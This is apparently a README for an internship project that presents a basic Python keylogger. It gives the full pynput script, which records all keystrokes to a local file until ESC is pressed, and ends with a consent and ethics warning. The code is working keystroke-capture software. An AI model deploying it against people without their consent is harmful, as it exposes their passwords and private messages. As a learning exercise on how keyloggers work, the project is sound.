Simple Keylogger in Python
Project Overview
Welcome to the Simple Keylogger in Python project! This project is part of my internship at Prodigy InfoTech. The goal of this task is to create a basic keylogger that captures and logs keystrokes. This project serves as a learning experience to understand how keyloggers work, their ethical implications, and the importance of cybersecurity.

Features
Keystroke Logging: Captures all keystrokes made by the user.
Special Key Handling: Identifies and logs special keys (e.g., Shift, Ctrl, etc.).
Logging to File: Saves the logged keystrokes to a specified text file.
Start/Stop Functionality: Listens for key press and release events to start and stop the keylogger.
Getting Started
Prerequisites
Ensure you have Python installed on your machine. You can download Python from here.

Installation
Clone the repository:

bash
Copy code
git clone https://github.com/Liyu-Desta/PRODIGY_CS_04.git
cd PRODIGY_CS_04
Install the required library:

bash
Copy code
pip install pynput
Usage
Navigate to the project directory:

bash
Copy code
cd PRODIGY_CS_04
Run the keylogger script:

bash
Copy code
python keylogger.py
Press keys on your keyboard to log them. The keystrokes will be saved to key_log.txt in the same directory.

To stop the keylogger, press the ESC key.

Code Explanation
The keylogger script is structured as follows:

python
Copy code
from pynput import keyboard

# Define the file where the keystrokes will be logged
log_file = "key_log.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
            print(f'Logged key: {key.char}')  # Debugging print statement
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f'[{key}]')
            print(f'Logged special key: {key}')  # Debugging print statement

# Function to stop the keylogger (for demonstration, let's stop on ESC key)
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
on_press: This function logs regular and special keystrokes to key_log.txt.
on_release: This function stops the keylogger when the ESC key is pressed.
keyboard.Listener: Starts the listener to monitor key press and release events.
Ethical Considerations
Important: This keylogger is for educational purposes only. Logging keystrokes without explicit permission is illegal and unethical. Always obtain consent from users before deploying any keylogging software. Use this knowledge responsibly to enhance cybersecurity.
